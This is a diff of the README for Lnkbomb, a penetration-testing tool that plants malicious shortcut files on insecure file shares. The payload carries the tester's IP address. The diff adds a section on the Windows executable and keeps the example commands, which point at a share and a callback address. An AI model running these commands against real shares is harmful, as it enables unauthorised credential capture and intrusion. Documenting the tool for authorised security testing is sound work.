@@ -10,7 +10,7 @@ Lnkbomb is used for uploading malicious shortcut files to insecure file shares. 
 
 The payload file is uploaded directly to the insecure file specified by the tester in the command line. The tester includes their IP address as well, which is written into the payload.
 
-## Usage
+## Python Usage
 Installing Lnkbomb
 
 ```git clone https://github.com/dievus/lnkbomb.git```
@@ -34,6 +34,9 @@ Examples of full commands include:
 ```python3 lnkbomb.py -t \\192.168.1.1\Share -a 192.168.1.2```
 
 ```python3 lnkbomb.py -r randomfilegenerated.recover```
+
+## Executable Usage
+Download Lnkbomb from the releases link on the right side of the page.  All flags are the same as the Python version, with the exception of using lnkbomb.exe rather than python3 lnkbomb.py.
 
 <p align="center">
   <img src="https://github.com/dievus/lnkbomb/blob/main/images/example2.png" />
